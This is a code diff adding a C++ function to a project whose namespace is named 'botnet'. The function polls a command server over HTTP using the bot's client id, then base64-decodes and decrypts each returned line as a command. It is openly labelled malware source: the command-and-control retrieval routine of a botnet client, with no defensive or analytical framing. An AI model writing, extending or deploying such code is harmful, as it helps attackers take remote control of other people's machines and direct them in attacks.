@@ -139,6 +139,41 @@ namespace botnet{
 		return m;
 	}
 
+    std::vector<std::string> master_conn::ask_for_cmd() {
+        typedef botnet::http::http_request http_request;
+        typedef botnet::http::http_client http_client;
+
+        std::vector<std::string> arr;
+
+        std::string host = HOST + ':' + std::to_string(PORT);
+        std::string content;
+
+        http_request *http_req = new http_request(botnet::http::GET);
+        http_request::headers header;
+        header.add("Host", host);
+        count_conn++;
+
+        std::string path = "?id=" + client_id;
+
+        http_req->setPath(path);
+        http_req->setHeaders(header);
+
+        http_client *http_c = new http_client(HOST, PORT);
+        http_c->request(http_req);
+
+        std::cout << http_c->getContent() << "----------------\n";
+
+        content = http_c->getContent();
+
+        arr = split(content, "\n");
+
+        for (int i = 0; i < arr.size(); i++) {
+            arr[i] = decrypt(base64_decode(arr[i]));
+        }
+
+        return arr;
+    }
+
 
 
 }
